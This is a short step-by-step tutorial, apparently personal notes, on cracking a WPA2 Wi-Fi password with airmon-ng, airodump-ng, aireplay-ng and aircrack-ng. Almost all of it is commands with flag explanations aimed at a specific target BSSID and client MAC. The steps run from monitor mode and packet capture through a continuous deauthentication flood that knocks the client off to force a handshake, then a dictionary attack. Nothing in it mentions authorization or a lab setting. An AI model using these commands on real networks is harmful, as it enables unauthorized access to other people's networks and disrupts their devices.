cracking wpa2 wifi password

stop all the process that takes place in the wifi card
~ sudo airmon-ng check kill

put the wifi in monitor mode
~ sudo airmon-ng start wlan0

check the wifi is in monitor mode
~ iwconfig

start capturing packets in the range
~ sudo airodump-ng wlan0
we will be listed with all the network around us

select the target network and 
its BSSID and its channel

now target the selected network
~ sudo airodump-ng -c5 -w captured_packet -d B4:F9:49:80:76:E5 wlan0
	-c5	for using channel 5
		to use respective channel
		-c2 channel 2
		-c3 channel 3
	-w captured_packet
		to store the captured packet in a file
	-d B4:F9:49:80:76:E5
		BSSID of the targeted network
		
open a new shell
now we try to deauth the connected device to make a wpa handshake
~ sudo aireplay-ng --deauth 0 -a B4:F9:49:80:76:E5 -c 6C:24:A6:8A:CE:33 wlan0
	--deauth	try to deauthenticate with the flag
	-a B4:F9:49:80:76:E5
			target network BSSID
	-c 6C:24:A6:8A:CE:33
			device connected to the network
			
this will take a huge amount of time
after a WPA handshake: B4:F9:49:80:76:E5 is found stop the deauth and airodump-ng

now we need a dictionary file for password attack password.txt

now we try to crack the wifi password with the help of the wpa handshake hash and the password.txt file
~ sudo aircrack-ng captured_packet-01.cap -w password.txt

if found it will show the password and if not found update your password.txt file
